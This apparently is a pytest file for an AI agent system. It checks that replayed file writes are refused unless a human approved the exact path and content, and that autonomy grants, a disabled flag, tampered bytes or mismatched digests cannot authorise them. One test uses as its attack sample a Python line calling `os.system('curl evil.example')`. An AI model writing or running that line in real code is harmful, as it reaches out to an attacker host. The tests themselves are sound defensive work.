"""Stage 2 slice 2: a replay may re-perform a write, under one narrow rule.

Slice 1 built the record. This is where it is consulted, so these tests are
about what is REFUSED at least as much as what is allowed. Every widening the
design deliberately rejected gets its own failing case:

* the skill's history must not authorise a write;
* `autonomy.is_earned`'s `<dir>/*<.ext>` grant must not authorise a write;
* a digest with no matching human approval must not authorise a write;
* the flag being off must mean nothing writes at all.
"""

from __future__ import annotations

import hashlib
from pathlib import Path

import pytest

from aios import config
from aios.core.autonomy import AutonomyLedger
from aios.core.cerebellum import Cerebellum, PlaybookStep, WriteConfirmation
from aios.core.replay_writes import record_approval, store_content
from aios.memory.db import init_memory_db
from aios.security import scope_lock


class _ClearStop:
    """A latch that is wired and not engaged."""

    def assert_operational(self):
        return None


_CONTENT = "def add(a, b):\n    return a + b\n"
_DIGEST = hashlib.sha256(_CONTENT.encode("utf-8")).hexdigest()


@pytest.fixture()
def db_path(tmp_path) -> Path:
    p = tmp_path / "slice2.db"
    init_memory_db(p)
    return p


@pytest.fixture()
def sandbox(tmp_path, monkeypatch) -> Path:
    root = tmp_path / "sandbox"
    root.mkdir()
    monkeypatch.setattr(scope_lock, "_SCOPE_LOCK", scope_lock.ScopeLockAuthority())
    scope_lock.set_scope_roots([root])
    return root


def _step(path: str = "util.py", digest: str = _DIGEST) -> PlaybookStep:
    return PlaybookStep("create_file", {"filepath": path, "content_sha256": digest})


# --------------------------------------------------------------------------- #
# cerebellum: what it will and will not hand to the dispatcher
# --------------------------------------------------------------------------- #


def test_no_bytes_are_offered_while_the_flag_is_off(db_path, sandbox, monkeypatch):
    """Off by default means stage 1 behaviour, not "writes with extra steps"."""
    record_approval("util.py", _CONTENT, db_path=db_path)
    monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", False)

    assert (
        Cerebellum(db_path)._write_args_if_replayable(
            _step(), WriteConfirmation(False, "util.py does not exist", missing=True)
        )
        is None
    )


def test_bytes_are_offered_when_the_target_is_missing(db_path, sandbox, monkeypatch):
    """The positive case, so the refusals below cannot pass vacuously."""
    store_content(_CONTENT, db_path=db_path)
    monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)

    args = Cerebellum(db_path)._write_args_if_replayable(
        _step(), WriteConfirmation(False, "util.py does not exist", missing=True)
    )

    assert args is not None
    assert args["content"] == _CONTENT
    assert args["content_sha256"] == _DIGEST


def test_nothing_is_offered_when_the_file_exists_but_differs(
    db_path, sandbox, monkeypatch
):
    """`create_file` refuses to overwrite, so this is out of scope by construction.

    Forcing the attempt would produce a refusal from the handler and look like
    a failure; abstaining says the true thing -- repairing an existing file
    needs `edit_file`, which is slice 4.
    """
    store_content(_CONTENT, db_path=db_path)
    monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)

    assert (
        Cerebellum(db_path)._write_args_if_replayable(
            _step(), WriteConfirmation(False, "util.py exists but its content differs")
        )
        is None
    )


def test_nothing_is_offered_when_the_content_was_never_stored(
    db_path, sandbox, monkeypatch
):
    """A refused blob (it carried secrets) leaves the replay confirm-only."""
    monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)

    assert (
        Cerebellum(db_path)._write_args_if_replayable(
            _step(), WriteConfirmation(False, "util.py does not exist", missing=True)
        )
        is None
    )


# --------------------------------------------------------------------------- #
# tool_agent: the authorisation itself
# --------------------------------------------------------------------------- #


def _agent(sandbox: Path, db_path: Path, autonomy=None):
    from aios.agents.tool_agent import ToolAgent
    from aios.core.executor import Executor

    class _Runner:
        def run(self, *a, **k):
            raise AssertionError("no command should run in these tests")

    agent = ToolAgent(
        None,
        Executor(runner=_Runner(), audit_log=lambda *a, **k: None),
        read_root=sandbox,
    )
    # Default to a REAL ledger with a clear stop. Passing `None` used to make
    # every authorisation skip the emergency-stop check, so these tests passed
    # while proving nothing about it.
    agent.autonomy = (
        autonomy
        if autonomy is not None
        else AutonomyLedger(db_path=db_path, emergency_stop=_ClearStop())
    )
    return agent


def test_a_replayed_write_without_an_approval_is_blocked(db_path, sandbox, monkeypatch):
    """THE BAR. Content in the store is not permission to write it.

    The blob store and the decision record are separate on purpose: bytes being
    available says nothing about a human having chosen them for this path.
    """
    store_content(_CONTENT, db_path=db_path)  # bytes present, NO approval recorded
    monkeypatch.setattr(config, "MEMORY_DB_PATH", db_path)
    monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)

    output, status, _ = _agent(sandbox, db_path)._replay_create_file(
        {"filepath": "util.py", "content": _CONTENT, "content_sha256": _DIGEST}
    )

    assert status == "blocked"
    assert "no human has approved" in output
    assert not (sandbox / "util.py").exists(), "an unapproved replay wrote a file"


def test_an_earned_glob_does_not_authorise_a_replayed_write(
    db_path, sandbox, monkeypatch
):
    """The wide grant must not leak into the narrow path.

    `autonomy.is_earned("create_file", ...)` keys on `<dir>/*<.ext>` and is the
    obvious thing for a future edit to reach for here. Earn it, and assert the
    replayed write is still refused.
    """
    ledger = AutonomyLedger(db_path=db_path, min_successes=1)
    for _ in range(3):
        ledger.record_outcome("create_file", "util.py", success=True)
    assert ledger.is_earned("create_file", "util.py", enabled=True)

    store_content(_CONTENT, db_path=db_path)
    monkeypatch.setattr(config, "MEMORY_DB_PATH", db_path)
    monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)

    output, status, _ = _agent(sandbox, db_path, autonomy=ledger)._replay_create_file(
        {"filepath": "util.py", "content": _CONTENT, "content_sha256": _DIGEST}
    )

    assert status == "blocked", "an earned glob authorised a replayed write"
    assert not (sandbox / "util.py").exists()


def test_an_approved_write_is_replayed_with_the_approved_bytes(
    db_path, sandbox, monkeypatch
):
    """The whole point: the file appears, containing what the human approved."""
    record_approval("util.py", _CONTENT, db_path=db_path)
    monkeypatch.setattr(config, "MEMORY_DB_PATH", db_path)
    monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)

    _, status, failed = _agent(sandbox, db_path)._replay_create_file(
        {"filepath": "util.py", "content": _CONTENT, "content_sha256": _DIGEST}
    )

    assert failed is False
    assert status in ("ok", "noop")
    assert (sandbox / "util.py").read_text(encoding="utf-8") == _CONTENT


def test_bytes_that_differ_from_the_approval_are_blocked(db_path, sandbox, monkeypatch):
    """Drift in content misses the record, so nothing is written."""
    record_approval("util.py", _CONTENT, db_path=db_path)
    monkeypatch.setattr(config, "MEMORY_DB_PATH", db_path)
    monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)

    tampered = "def add(a, b):\n    return a - b\n"
    _, status, _ = _agent(sandbox, db_path)._replay_create_file(
        {
            "filepath": "util.py",
            "content": tampered,
            "content_sha256": hashlib.sha256(tampered.encode()).hexdigest(),
        }
    )

    assert status == "blocked"
    assert not (sandbox / "util.py").exists()


def test_a_digest_that_does_not_match_its_content_cannot_smuggle_bytes(
    db_path, sandbox, monkeypatch
):
    """The approved DIGEST with unapproved CONTENT must not write.

    The lookup is by digest, so an attacker-supplied pair (approved digest,
    different bytes) is the obvious attack. `create_file` writes the content it
    is handed, so the digest alone deciding would write bytes nobody approved.
    """
    record_approval("util.py", _CONTENT, db_path=db_path)
    monkeypatch.setattr(config, "MEMORY_DB_PATH", db_path)
    monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)

    evil = "import os\nos.system('curl evil.example')\n"
    _, status, _ = _agent(sandbox, db_path)._replay_create_file(
        {"filepath": "util.py", "content": evil, "content_sha256": _DIGEST}
    )

    written = (
        (sandbox / "util.py").read_text(encoding="utf-8")
        if (sandbox / "util.py").exists()
        else ""
    )
    assert evil not in written, "unapproved bytes were written under an approved digest"


def test_the_dispatcher_does_not_blanket_approve_writes() -> None:
    """A structural guard on the reason all of the above holds.

    `_dispatch_approved` treats compiled steps as pre-approved because the
    SKILL earned trust before compilation. That reasoning is about commands. If
    a future edit adds create_file to that blanket -- the comment in there used
    to invite exactly this by claiming only execute_terminal and verify were
    compilable -- every compiled write would run unattended.
    """
    import inspect

    from aios.agents.tool_agent import ToolAgent

    source = inspect.getsource(ToolAgent._dispatch_approved)

    assert "self._replay_create_file(args)" in source, (
        "create_file no longer routes through the narrow check"
    )
    assert "approved_creations={filepath" not in source, (
        "the dispatcher grants writes directly instead of via _replay_create_file"
    )
